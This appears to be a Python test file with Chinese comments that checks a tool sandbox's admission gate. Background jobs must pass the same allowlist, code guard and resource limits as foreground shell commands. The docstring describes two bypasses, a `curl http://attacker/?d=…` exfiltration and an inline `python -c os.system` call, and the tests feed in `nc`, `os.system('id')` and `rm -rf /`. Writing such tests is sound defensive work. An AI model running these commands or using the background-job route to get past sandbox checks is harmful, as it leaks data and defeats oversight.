"""后台命令 `tool_job` 必须与前台执行同一套沙箱准入。

背景（本轮生产审查发现）：`shell_exec` / `persistent_shell` 都走
「逃逸拦截 + 可执行名白名单 + python 代码静态检查 + rlimit」，而后台命令
`execute_tool_job` **只有逃逸拦截** —— 同一个沙箱、同一个 workspace，却少了
两层防护，并且没有资源上限（且它跑得比前台久得多：`JOB_TIMEOUT` 是 1 小时）。

于是存在两条实测可用的绕过路径：

* `run_in_background("curl http://attacker/?d=…")` —— 没查白名单，外带数据；
* `run_in_background("python -c 'import os; os.system(…)'")` —— 没查 code_guard，
  而把同一段代码交给 `shell_exec` 会被拦。

这里钉住两层：**行为**（准入函数本身拒绝）+ **接线**（job_runner 真的调了它，
并且子进程带上了 rlimit）。只测其一都不够：函数写对了但没接上，线上照样是漏的。
"""

from __future__ import annotations

import pytest

from app.tools.sandbox import check_shell_command
from tests.source_scan import code_of


@pytest.mark.asyncio
async def test_blocks_non_allowlisted_executable():
    """白名单：与 shell_exec 同一套可执行名，不在表里的一律拒绝。"""
    # 用不含逃逸模式（`/` 根路径、`X:/`、`~`、`$HOME`）的命令，才能单独验到白名单这一层
    # —— 否则先命中的是逃逸拦截，测试就变成在验另一件事了。
    reason = await check_shell_command("nc -zv example.com 443")
    assert reason is not None and "not allowed" in reason


@pytest.mark.asyncio
async def test_blocks_python_inline_dangerous_code():
    """`python -c` 的内联代码要过 code_guard（此前后台路径完全没有这一层）。"""
    reason = await check_shell_command("python -c \"import os; os.system('id')\"")
    assert reason is not None
    assert "python code rejected" in reason


@pytest.mark.asyncio
async def test_allows_benign_command():
    """不误伤：白名单内的普通命令照常放行（否则后台任务整体不可用）。"""
    assert await check_shell_command("echo hi") is None


@pytest.mark.asyncio
async def test_blocks_escape_before_anything_else():
    """逃逸拦截仍然在最前面（与既有行为一致）。"""
    reason = await check_shell_command("rm -rf /")
    assert reason is not None
    assert "escape pattern blocked" in reason


def test_job_runner_uses_shared_gate_and_rlimits():
    """接线守卫：`execute_tool_job` 必须调用共享准入并施加 rlimit。

    用 `code_of` 剥掉注释再匹配 —— 否则"把调用注释掉"的回归仍能通过字面量断言
    （这正是 `tests/source_scan.py` 存在的理由）。
    """
    code = code_of("app/tools/job_runner.py")
    assert "check_shell_command(command)" in code, "后台命令没有走与 shell_exec 同一套准入"
    assert "**_rlimit_kwargs()" in code, "后台命令缺少资源限制（长跑进程会拖垮副本）"


def test_job_runner_no_longer_only_escapes():
    """回归销定：`_has_escape` 不再作为后台命令的**唯一**防线。

    `_has_escape` 现在只应经由 `check_shell_command` 间接生效；直接调用说明有人把
    "三层防护"又写回了"只查正则"。
    """
    code = code_of("app/tools/job_runner.py")
    assert "_has_escape(" not in code
